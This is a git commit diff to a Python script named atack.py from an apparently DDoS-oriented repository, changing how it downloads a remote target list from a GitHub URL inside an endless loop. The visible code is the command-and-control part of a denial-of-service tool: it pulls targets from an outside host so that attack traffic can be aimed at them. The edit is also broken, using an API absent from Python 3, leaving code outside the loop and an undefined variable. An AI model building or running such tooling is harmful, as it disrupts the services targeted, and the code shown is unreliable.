e210e1114ea791ded31eeeae19ef4462f9965381
Patonia <for_i@i.ua>
2022-04-01 19:53:22 +0300

    Update atack.py

--- atack.py
+++ atack.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import socket,time,threading,sys,random,os,subprocess,requests
+import socket,time,threading,sys,random,os,subprocess,requests,urllib
 from os import getcwd
 
 with open('test.txt', 'w') as f:
@@ -11,13 +11,15 @@ os.remove("test.txt")
    
 while 1 == 1:
     timeout=time.time()+3600
-    url = "https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt"
-    directory = getcwd()
-    filename = directory + 'target.txt'
-    r = requests.get(url)
-    f = open(filename,'w')
-    f.write(str(r.content)+'\n')
-    f.close
+ #   url = "https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt"
+ #   directory = getcwd()
+ #   filename = directory + 'target.txt'
+ #   r = requests.get(url)
+ #   f = open(filename,'w')
+ #   f.write(str(r.content)+'\n')
+ #   f.close
+testfile = urllib.URLopener()
+testfile.retrieve("https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt", "target.txt")
     with open(filename,'r') as f:
         for row in f:
             rrow = row.split()
